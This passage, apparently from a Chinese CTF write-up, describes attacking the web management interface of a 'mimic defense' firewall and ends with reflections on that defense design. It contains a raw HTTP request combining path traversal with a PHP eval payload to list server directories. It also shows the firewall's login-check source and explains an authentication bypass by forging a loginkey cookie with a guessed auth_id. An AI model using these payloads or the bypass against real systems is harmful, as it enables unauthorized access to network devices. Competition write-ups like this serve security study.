还有别的代码来联通别的执行体。
由于没有 /bin ，导致服务端不能执行system函数，这大大影响了我的攻击效率，这可能也是我被反超
的一个原因...
继续使用php eval shell，我们发现后端3个执行体分别为nginx\apache\lighthttpd，实际上来说都是在
同一个文件夹下
由于 Web 的服务器可以随便攻击，有趣的是，在未知情况下，服务端会被重置，但神奇的是，一次一
般只会重置3个服务端的一部分，这里也没有拟态裁决的判定，只要单纯的刷新就可以进入不同的后端，
其感觉就好像是负载均衡一样。
这样我不禁怀疑起服务端的完成方式，大概像裁决机是被设定拼接在某个部分之前的，其裁决的内容也
有所设定，到这里我们暂时把服务端架构更换。
GET /?
c=Auth/User&a=index&assign=0&w=../../../../../../../../tmp/index1&ddog=var_dump(
scandir('/usr/local/apache2/htdocs')); HTTP/1.1
Host: 172.29.118.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 
Firefox/66.0
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=spk6s3apvh5c54tj9ch052fp53; think_language=zh-CN
Upgrade-Insecure-Requests: 
/usr/local/apache2/htdocs
/usr/local/nginx/htdocs
/usr/local/lighttpd/htdocs
阅读服务端代码
在拿到 shell 之后，主办方强调 Web 服务和题目无关，需要修改后端的访问控制权限，由于本地的代码
和远程差异太大，所以首先要拿到远端的代码。
从 /conf/menu.php 中可以获得相应功能的路由表。
其中设置防火墙访问控制权限的路由为 ?c=Policy/Interview&a=control_show',
然后直接读远端的代码 /Controller/Policy/interviewController.class.php
其操作相关为
...
'policy' => array(
    'text' => L('SECURE_POLICY'),
    'childs' => array(
        //访问控制
        'firewall' => array(
            'text' => L('ACCESS_CONTROL'),
            'url' => '?c=Policy/Interview&a=control_show',
            'img' => '28',
            'childs' => ''
        ),
        //地址转换
        'nat' => array(
            'text' => L('NAT'),
            'url' => '',
            'img' => '2',
            'childs' => array(
                'nat' => array(
                    'text' => 'NAT',
                    'url' => '?c=Policy/Nat&a=nat_show'
                )
直接访问这个路由发现权限不够，跟入 getPrivilege
一直跟到 checklogin
发现对 cookie 中的 loginkey 操作直接对比了 auth_id ，id 值直接盲猜为1，于是绕过权限控制
添加相应的 cookie ，就可以直接操作访问控制页面的所有操作，但是后端有拟态防御，所以访问 500.
至此，我无意中触发了拟态扰动...这完全是在我心理预期之外的触发，在我的理解中，我以为是我的参
数配置错误，或者是这个 api 还需要添加策略组，然后再修改。由于我无法肯定问题出在了哪，所以我
一直试图想要看到这个策略修改页面，并正在为之努力。（我认为我应该是在正常的操作功能，不会触
发拟态扰动...）
//添加策略
public function interviewAdd() {
    if (getPrivilege("firewall") == 1) {
        if($_POST['action1']!='')  $param['action'] = 
formatpost($_POST['action1']);
        if($_POST['enable']!='')  $param['enable'] = 
formatpost($_POST['enable']);
        if($_POST['log1']!='')  $param['log'] = formatpost($_POST['log1']);
        if($_POST['srcarea']!='')  $param['srcarea'] = 
'\''.formatpost($_POST['srcarea'],false).'\'';
        if($_POST['dstarea']!='')  $param['dstarea'] = 
'\''.formatpost($_POST['dstarea'],false).'\'';
        /*域名*/
/**
 * 获取权限模板，$module是否有权限
 * @param string $module
 * @return int 1:有读写权限，2：读权限，0:没权限
 */
function getPrivilege($module) {
    if (!checkLogined()) {
        header('location:' . $_COOKIE['urlorg']);
    }
    return ngtos_ipc_privilege(NGTOS_MNGT_CFGD_PORT, M_TYPE_WEBUI, REQ_TYPE_AUTH, 
AUTH_ID, NGTOS_MNGT_IPC_NOWAIT, $module);
校验url合法性，是否真实登录
function checkLogined() {
    //获得cookie中的key
    $key = $_COOKIE['loginkey'];
//        debugFile($key);
    //获得url请求中的authid
//    $authid = $_GET['authid'];
//        debugFile($authid);
    //检查session中是否存在改authid和key
    if (!empty($key) && $key == $_SESSION['auth_id'][AUTH_ID]) {
        return true;
    } else {
        return false;
    }
}
/*
ps：这里膜@zsx和@超威蓝猫，因为我无法加载 jquery ，所以我看不到那个修改配置的页面是什么样
的，但 ROIS 直接用 js 获取页面内容渲染...
在仔细分析拟态的原理之后，我觉得如果这个功能可以被正常修改（在不被拟态拦截的情况下），那么
我们就肯定触发了所有的执行体（不可能只影响其中一台）。
那么我们反向思考过来，既然无法修改，就说明这个配置在裁决机背设置为白名单了，一旦修改就会直
接拦截并返回 500！
所以我们当时重新思考了拟态防火墙的结构...我们发现，因为Web服务作为防火墙的管理端，在防火墙
的配置中，至少应该有裁决机的 ip ，搞不好可以直接获取防火墙的 ip 。
这时候如果我们直接向后端ip构造socket请求，那么我们就能造成一次降维打击。
只是可惜，因为没有 system shell ，再加上不知道为什么蚁剑和菜刀有问题，我们只能花时间一个一个
文件去翻，结果就是花了大量的时间还没找到(远程的那份代码和我本地差异太大了)，赛后想来，如果当
场写一个脚本说不定就保住第一了2333
关于拟态（这是刚刚的那个2019的文章 不是我的总结）
在几次和拟态防御的较量中，拟态防御现在的形态模式也逐渐清晰了起来，从最开始的测信道攻击、
ddos攻击无法防御，以及关键的业务落地代价太大问题。逐渐到业务逻辑漏洞的防御缺陷。
拟态防御本身的问题越来越清晰起来，其最关键的业务落地代价太大问题，在现在的拟态防御中，逐渐
使用放弃一些安全压力的方式来缓解，现在的拟态防御更针对倾向于组件级安全问题的防御。假设在部
分高防需求场景下，拟态作为安全生态的一环，如果可以通过配置的方式，将拟态与传统的Waf、防火
墙的手段相结合，不得不承认，在一定程度上，拟态的确放大了安全防御中的一部分短板。拟态防御的
后续发展怎么走，还是挺令人期待的。
主要是要学会拟态的思想，把这个拟态思想运用到各种想的到的，想不到的地方。
此外，拟态一直在迭代，一直在优化。不是一层不变的
其次我觉得拟态自身一定会有安全问题，这是不可避免的，但是他不开源啊，不开源也是为了拟态的安
全。存在战略性的一些事情吧，现在也很难接触到。
大概这么多，不太多总结，自己感受一下，如果我有表达不清楚的地方，欢迎各位师傅提问，或者我讲
错 和讲的不好的地方，希望各位师傅多多指点。谢谢
作者:k0njacccc
email:PI:EMAIL
后面会附带一个读到有意义的文献压缩包。